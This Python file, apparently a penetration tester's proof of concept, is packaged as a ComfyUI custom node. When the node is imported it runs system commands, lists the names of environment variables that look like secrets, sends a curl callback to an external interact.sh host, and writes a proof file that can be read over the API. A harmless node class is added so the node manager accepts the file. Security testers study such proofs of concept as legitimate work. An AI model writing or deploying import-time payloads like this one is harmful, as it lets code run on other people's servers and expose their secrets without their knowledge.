import os
import subprocess

# --- Praetorian Security Assessment - RCE POC ---
# Executes on node load (import time).
# Evidence channels:
#   1. print() → visible in /internal/logs (browser-readable)
#   2. curl interact.sh → DNS callback evidence on interact.sh dashboard
#   3. Write to ComfyUI input/ dir → readable via /api/view?filename=...&type=input

try:
    id_output = subprocess.check_output(["id"], text=True).strip()
    hostname = subprocess.check_output(["hostname"], text=True).strip()
    env_keys = [k for k in os.environ if any(s in k.upper() for s in ["KEY", "SECRET", "TOKEN", "PASSWORD", "CREDENTIAL"])]

    proof = f"hostname: {hostname}\nid: {id_output}\npwd: {os.getcwd()}\nenv_secret_keys: {env_keys}\n"

    # Channel 1: ComfyUI logs (readable via /internal/logs in browser)
    print(f"[PRAETORIAN-POC] === RCE PROOF ===")
    print(f"[PRAETORIAN-POC] {id_output}")
    print(f"[PRAETORIAN-POC] hostname: {hostname}")
    print(f"[PRAETORIAN-POC] cwd: {os.getcwd()}")
    print(f"[PRAETORIAN-POC] secret env vars: {env_keys}")
    print(f"[PRAETORIAN-POC] === END PROOF ===")

    # Channel 2: interact.sh canary (DNS callback proof)
    subprocess.Popen(
        ["curl", "-s", "https://piwsu9gkbowtdmee.ixx.sh"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    print("[PRAETORIAN-POC] Canary callback sent to piwsu9gkbowtdmee.ixx.sh")

    # Channel 3: Write proof to ComfyUI input/ directory (readable via API)
    input_dir = os.path.join(os.environ.get("BASE_DIRECTORY", "/data"), "input")
    proof_path = os.path.join(input_dir, "praetorian-rce-poc.txt")
    with open(proof_path, "w") as f:
        f.write(proof)
    print(f"[PRAETORIAN-POC] Proof file written to {proof_path}")

except Exception as e:
    print(f"[PRAETORIAN-POC] Error: {e}")


# --- Valid ComfyUI node so the manager accepts it ---

class PraetorianPOCNode:
    @classmethod
    def INPUT_TYPES(cls):
        return {
            "required": {
                "text": ("STRING", {"default": "Praetorian POC"}),
            }
        }

    RETURN_TYPES = ("STRING",)
    RETURN_NAMES = ("output",)
    FUNCTION = "execute"
    CATEGORY = "utils"

    def execute(self, text):
        return (text,)


NODE_CLASS_MAPPINGS = {
    "PraetorianPOC": PraetorianPOCNode
}

NODE_DISPLAY_NAME_MAPPINGS = {
    "PraetorianPOC": "Praetorian POC"
}
